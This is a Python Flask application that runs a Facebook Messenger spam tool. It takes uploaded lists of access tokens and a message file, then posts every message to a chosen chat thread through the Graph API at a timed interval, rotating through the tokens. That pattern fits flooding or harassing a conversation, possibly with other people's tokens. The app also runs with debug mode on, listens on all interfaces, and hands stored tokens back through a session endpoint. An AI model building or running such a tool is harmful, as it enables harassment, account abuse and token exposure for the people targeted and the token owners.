from flask import Flask, request, render_template, jsonify, redirect, url_for, flash
import os
import secrets
import json
import threading
import time
from datetime import datetime
import requests

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)
app.debug = True

# Directories
SUBMISSIONS_DIR = "submissions"
SESSIONS_DIR = "sessions"
os.makedirs(SUBMISSIONS_DIR, exist_ok=True)
os.makedirs(SESSIONS_DIR, exist_ok=True)

# Store threads for running sessions
active_threads = {}

# Headers for requests
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
}

# --- Helper Functions ---
def save_session(key, data):
    path = os.path.join(SESSIONS_DIR, f"{key}.json")
    with open(path, "w") as f:
        json.dump(data, f, indent=2)

def load_session(key):
    path = os.path.join(SESSIONS_DIR, f"{key}.json")
    if os.path.exists(path):
        with open(path, "r") as f:
            return json.load(f)
    return None

def message_sender_thread(key):
    session = load_session(key)
    if not session:
        return
    tokens = session.get("tokens", [])
    messages = session.get("messages", [])
    time_interval = session.get("time_interval", 5)
    mn = session.get("kidx", "")
    token_type = session.get("token_type", "single")
    thread_id = session.get("thread_id", "")

    while session["status"] == "running":
        for token in tokens if token_type=="multi" else [session.get("token")]:
            for msg in messages:
                session = load_session(key)
                if session["status"] != "running":
                    break
                message_text = f"{mn} {msg}"
                try:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    parameters = {'access_token': token, 'message': message_text}
                    response = requests.post(api_url, data=parameters, headers=HEADERS)
                    session.setdefault("logs", []).append({
                        "token": token,
                        "message": message_text,
                        "status": response.status_code
                    })
                    save_session(key, session)
                    time.sleep(time_interval)
                except Exception as e:
                    session.setdefault("logs", []).append({"token": token, "message": message_text, "error": str(e)})
                    save_session(key, session)
                    time.sleep(10)
        break  # remove if continuous looping is needed

# --- Routes ---
@app.route("/", methods=["GET", "POST"])
def send_message():
    preview_messages = None
    token_count = None
    form_defaults = {}

    if request.method == "POST":
        token_type = request.form.get("tokenType")
        thread_id = request.form.get("threadId", "").strip()
        mn = request.form.get("kidx", "").strip()
        time_interval = int(request.form.get("time", 5))
        key = secrets.token_hex(8)

        form_defaults = {
            "tokenType": token_type,
            "threadId": thread_id,
            "kidx": mn,
            "time": time_interval,
            "accessToken": request.form.get("accessToken", "")
        }

        if not thread_id or not mn:
            flash("Fill required fields!")
            return render_template("panel.html", preview_messages=None, token_count=None, form_defaults=form_defaults, session_key=None)

        # Read messages
        if "txtFile" not in request.files or request.files["txtFile"].filename == "":
            flash("Upload message file!")
            return render_template("panel.html", preview_messages=None, token_count=None, form_defaults=form_defaults, session_key=None)
        txt_file = request.files["txtFile"]
        messages = txt_file.read().decode(errors="ignore").splitlines()
        preview_messages = messages[:200]

        # Read tokens if multi
        tokens = []
        if token_type == "single":
            access_token = request.form.get("accessToken")
            tokens = [access_token]
        else:
            if "tokenFile" not in request.files or request.files["tokenFile"].filename == "":
                flash("Upload token file!")
                return render_template("panel.html", preview_messages=preview_messages, token_count=None, form_defaults=form_defaults, session_key=None)
            token_file = request.files["tokenFile"]
            tokens = [t.strip() for t in token_file.read().decode(errors="ignore").splitlines() if t.strip()]
            token_count = len(tokens)

        # Save session
        session_data = {
            "key": key,
            "thread_id": thread_id,
            "kidx": mn,
            "time_interval": time_interval,
            "token_type": token_type,
            "tokens": tokens,
            "messages": messages,
            "status": "running",
            "logs": []
        }
        save_session(key, session_data)

        # Start message thread
        t = threading.Thread(target=message_sender_thread, args=(key,), daemon=True)
        active_threads[key] = t
        t.start()

        flash(f"Session started! Your session key: {key}")
        return render_template("panel.html", preview_messages=preview_messages, token_count=token_count, form_defaults=form_defaults, session_key=key)

    return render_template("panel.html", preview_messages=None, token_count=None, form_defaults={"tokenType": "single"}, session_key=None)

@app.route("/session/<key>", methods=["GET"])
def session_status(key):
    session = load_session(key)
    if session:
        return jsonify(session)
    return jsonify({"error": "Session not found"})

@app.route("/session/<key>/<action>", methods=["POST"])
def session_action(key, action):
    session = load_session(key)
    if not session:
        return jsonify({"error": "Session not found"})
    if action == "pause":
        session["status"] = "paused"
    elif action == "resume":
        session["status"] = "running"
        if key not in active_threads or not active_threads[key].is_alive():
            t = threading.Thread(target=message_sender_thread, args=(key,), daemon=True)
            active_threads[key] = t
            t.start()
    elif action == "stop":
        session["status"] = "stopped"
    save_session(key, session)
    return jsonify({"status": session["status"]})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
